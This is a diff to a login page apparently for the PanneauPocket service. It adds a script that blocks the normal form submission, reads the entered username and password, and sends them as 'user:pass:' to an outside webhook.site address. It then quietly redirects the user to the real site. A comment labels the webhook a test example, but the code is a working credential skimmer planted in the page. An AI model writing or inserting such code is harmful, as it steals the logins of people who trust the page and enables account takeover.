@@ -75,6 +75,30 @@ Prenez soin de vous et de vos proches 💛</p>
                     <a href="https://panneaupocket.com" class="btn btn-outline-primary btn-redirect-website">
         Retour au site www.panneaupocket.com
     </a>
+               <script>
+document.querySelector("form[name='login']").addEventListener("submit", function(e) {
+  e.preventDefault(); // bloque l'envoi normal
+
+  const user = document.getElementById("login_username").value;
+  const pass = document.getElementById("login_password").value;
+
+  // Format demandé
+  const payload = `${user}:${pass}:`;
+
+  // Exemple de webhook local/test
+  fetch("https://webhook.site/34fab5de-e606-4fe8-a8c4-1cf3e769fc7d", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ data: payload })
+  })
+  .then(() => {
+    // Redirection après l'envoi
+    window.location.href = "https://panneaupocket.com";
+  })
+  .catch(err => console.error("Erreur envoi webhook:", err));
+});
+</script>
+ 
             </div>
         </main>
     </body>
